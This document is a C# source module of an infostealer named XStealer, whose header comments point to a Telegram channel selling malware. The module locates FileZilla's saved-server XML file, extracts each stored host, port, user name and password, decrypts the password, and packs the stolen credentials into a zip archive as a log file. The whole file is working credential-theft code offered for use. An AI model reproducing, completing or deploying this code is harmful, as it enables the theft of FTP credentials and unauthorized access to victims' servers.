// By https://t.me/devxstudio
// https://t.me/devx_channel
// SHOP MALWARE: https://t.me/devxstudiobot
namespace XStealer.Modules.Apps
{
    using System.IO;
    using System.Xml;
    using Helpers;

    public static class FileZilla
    {
        /// <summary>
        /// <br><b>RUS</b></br><br>Метод для получения данных из FileZilla</br>
        /// <br><b>ENG</b></br><br>Method for getting data from FileZilla</br>
        /// </summary>
        public static void Inizialize()
        {
            using var ms = new MemoryStream { Position = 0 };
            if (File.Exists(GlobalPaths.FZilla))
            {
                try
                {
                    // Загружаем Xml файл
                    var xf = new XmlDocument() { XmlResolver = null };
                    xf.Load(GlobalPaths.FZilla);
                    // Получаем элементы
                    XmlNodeList bb = xf.GetElementsByTagName("RecentServers");
                    XmlNodeList bs = ((XmlElement)bb[0]).GetElementsByTagName("Server");

                    // Перебираем элементы данных и запись их в поток MemoryStream
                    using var data = new StreamWriter(ms);
                    foreach (XmlElement elementEx in bs)
                    {
                        data.WriteLine($"HostName: {elementEx.GetElementsByTagName("Host")[0]?.InnerText}");
                        data.WriteLine($"Port: {elementEx.GetElementsByTagName("Port")[0]?.InnerText}");
                        data.WriteLine($"UserName: {elementEx.GetElementsByTagName("User")[0]?.InnerText}");
                        data.WriteLine($"Password: {DecoderEx.DecryptFZilla(elementEx.GetElementsByTagName("Pass")[0]?.InnerText)}\r\n");
                    }
                    data.Flush();
                }
                catch { }
            }
            ZipEx.AddKeyPairStream("FileZilla_Log.txt", ms?.ToArray() ?? ms?.GetBuffer() ?? null);
        }
    }
}
